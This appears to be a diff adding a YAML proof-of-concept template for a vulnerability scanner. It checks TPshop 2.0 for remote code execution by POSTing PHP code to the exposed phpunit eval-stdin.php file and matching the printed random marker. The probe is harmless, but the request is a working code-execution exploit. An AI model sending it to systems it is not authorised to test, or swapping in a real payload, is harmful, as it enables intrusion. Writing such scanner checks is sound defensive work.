@@ -1,0 +1,17 @@
+name: poc-yaml-tpshop-rce
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+rules:
+  - method: POST
+    path: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+    body: >-
+      <?php printf("{{r1}}%%{{r2}}");
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes(r1 + "%" + r2))
+detail:
+  Affected Version: "tpshop2.0"
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  links:
+    - https://www.cnblogs.com/ichunqiu/p/7832657.html
